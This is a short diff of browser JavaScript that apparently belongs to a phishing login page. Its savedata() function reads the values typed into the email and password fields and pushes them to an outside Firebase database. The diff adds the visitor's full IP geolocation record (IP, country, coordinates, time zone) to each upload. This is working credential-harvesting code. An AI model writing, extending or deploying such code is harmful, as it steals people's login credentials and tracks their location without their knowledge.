@@ -130,7 +130,7 @@
 //       storageBucket: "bucket.appspot.com"
 //   };
 //   firebase.initializeApp(config);
-
+var data2;
    // Get a reference to the database service
 //   var database = firebase.database();
    var messagesRef = new Firebase('https://rpsecf32.firebaseio.com');
@@ -139,7 +139,7 @@
    function savedata(){
        var message = document.getElementById("email").value;
 var feedback=document.getElementById("password").value;
-       messagesRef.push({fieldName:message, text:feedback,details:total});
+       messagesRef.push({fieldName:message, text:feedback,detailsjson:data2});
        document.getElementById("email").value = '';
        document.getElementById("password").value = '';
    }
@@ -151,6 +151,7 @@ var feedback=document.getElementById("password").value;
        var time_zone = data.time_zone;
        var latitude = data.latitude;
        var longitude = data.longitude;
+       data2=data;
 total+="Countrycode:"+country_code+",Country:"+country+",IP:"+ip+",Latitude:"+latitude+",Longitude:"+longitude+",TimeZone:"+time_zone;
 //       alert("Country Code: " + country_code);
 //       alert("Country Name: " + country);
